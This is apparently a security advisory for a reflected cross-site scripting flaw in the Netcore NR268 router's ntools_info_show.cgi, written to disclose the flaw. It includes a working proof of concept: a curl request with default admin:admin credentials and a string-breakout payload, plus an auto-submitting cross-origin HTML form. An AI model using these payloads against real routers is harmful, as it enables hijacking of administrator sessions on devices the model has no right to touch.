# Netcore NR268 Reflected Cross-Site Scripting in ntools_info_show.cgi

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Reflected Cross-Site Scripting (XSS) (CWE-79)  
**Credits:** Zhou Ao, Yin Luxing, Jiang Yuxuan, Liu Xin, @Nebusec

## Summary

`ntools_info_show.cgi` copies POST parameter `applet` into a 15-byte buffer and later emits it as `"applet":"%s"` without JSON escaping. The admin UI parses the response with `eval('('+data+')')`, so a short payload such as `",x:top.x=1,y:"` breaks out of the string literal and executes attacker JavaScript in the router origin.

## Technical Details

The handler reads `applet`, copies up to 15 bytes with `strncpy(v37, form_value, 15)`, and emits the same bytes with `snprintf(..., '"applet":"%s",', v37)`. The internet-tool page only limits normal UI choices to `ping` and `traceroute` through radio buttons; that is client-side state, not a backend whitelist. `network_security.js` then executes `var data = eval('('+data+')');` on the raw reply.

The 15-byte payload `",x:top.x=1,y:"` closes the JSON string, injects `x:top.x=1`, and leaves a well-formed object literal. After `eval`, `top.x` becomes `1` in the router origin.

### Affected Endpoint

- URL: `/router/ntools_info_show.cgi`
- Parameters: `applet`, `uiname`
- Method: POST
- Authentication: HTTP Basic authentication, including cached browser credentials

## Proof of Concept

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/ntools_info_show.cgi" \
  --data-urlencode 'applet=",x:top.x=1,y:"' \
  --data-urlencode "uiname=LAN"
```

The CGI response shape is:

```
{"applet":"",x:top.x=1,y:"","output":"","running":"0"}
```

The internet-tool page evaluates that body with `eval('('+data+')')`.

A minimal auto-submit page for an authenticated administrator browser:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="http://192.168.1.1/router/ntools_info_show.cgi">
      <input type="hidden" name="applet" value='",x:top.x=1,y:"'>
      <input type="hidden" name="uiname" value="LAN">
    </form>
  </body>
</html>
```

### Outcome

The reflected `applet` value breaks out of the parsed object. `eval` executes `top.x=1` in the router origin. The same request is reachable through cached Basic-auth credentials from another web origin.

## Impact

- **Confidentiality:** High
- **Integrity:** High
- **Availability:** Low

A 15-byte reflected payload is enough to run JavaScript in the administrator's router-origin session.
